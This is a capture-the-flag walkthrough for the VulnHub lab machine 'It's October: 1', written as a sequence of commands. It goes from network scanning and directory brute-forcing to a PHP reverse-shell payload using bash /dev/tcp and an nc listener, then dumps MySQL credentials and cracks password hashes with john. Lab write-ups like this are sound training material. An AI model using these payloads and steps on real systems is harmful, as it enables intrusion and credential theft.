:::::::::::::::::::::::::: page
# It's October: 1 {#its-october-1 .title}

\

## 

## It's October: 1

- **[It's October: 1]{style="color:#060f94;"}** :-

<!-- -->

- Download the machine :
  <https://www.vulnhub.com/entry/its-october-1,460/>

![](images/783-1.png)

- Open ova file .
- Then click finish .
- Start the machine .

1.  [Network Scanning]{style="color:#f6d32d;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](images/783-2.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.179
:::

![](images/783-3.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.179
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.179  
:::

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

::: codebox
    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.179
:::

![](images/783-4.png)

1.  [Web Enumeration]{style="color:#f6d32d;"} :

- IP visit in browser : <http://192.168.2.179/>
  <http://192.168.2.179:8080/>

<!-- -->

- Now view the source code in port 8080 :

![](images/783-5.png)

- Visit the mynote.txt parameter :
  <http://192.168.2.179:8080/mynote.txt>

![](images/783-6.png)

::: codebox
    User : admin
    Password : adminadmin2
:::

- Directory brute force to find the parameter :

::: codebox
    gobuster dir -u http://192.168.2.179 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip
:::

![](images/783-7.png)

- Visit the parameter :
  <http://192.168.2.179/backend/backend/auth/signin>

![](images/783-8.png)

- Login the backend page : <http://192.168.2.179/backend/backend>

![](images/783-9.png)

1.  [Get the Reverse shell]{style="color:#f6d32d;"} :

- Go to CMS .

<!-- -->

- Click to ADD to make a new page :

![](images/783-10.png)

- Enter the reverse shell payload :

::: codebox
    function onStart() {
        shell_exec("bash -c 'bash -i >& /dev/tcp/192.168.2.218/443 0>&1'");
    }
:::

![](images/783-11.png)

- In Markup add this :

::: codebox
    test
:::

- Then click to save .

<!-- -->

- Start the listener :

::: codebox
    nc -lvnp 443
:::

- Then call the parameter in browser :

::: codebox
    http://192.168.2.179/test
:::

- We get the shell :

![](images/783-12.png)

- Shell Stabilization :

::: codebox
    python3 -c 'import pty;pty.spawn("/bin/bash")'
:::

- 

::: codebox
    export TERM=xterm
:::

1.  [Database Credentials Discovery]{style="color:#f6d32d;"} :

- Check the list :

::: codebox
    ls -lh
:::

- Navigate the config directory :

::: codebox
    cd config
:::

![](images/783-13.png) Found the database.php file .

- Read the file :

::: codebox
    cat database.php
:::

![](images/783-14.png) Found the username and password .

1.  [MySQL Access]{style="color:#f6d32d;"} :

- MySQL login :

::: codebox
    mysql -u root -proot
:::

![](images/783-15.png)

- Database Enumeration :

::: codebox
    show databases;
:::

- 

::: codebox
    use octoberdb;
:::

- 

::: codebox
    show tables;
:::

- 

::: codebox
    select login,password from backend_users;
:::

- 

![](images/783-16.png) ![](images/783-17.png) Found password hash .

- Crack the hash with john :

::: codebox
    nano hash.txt
:::

![](images/783-18.png)

::: codebox
    john --wordlist=/opt/rockyou.txt hash.txt
:::
::::::::::::::::::::::::::
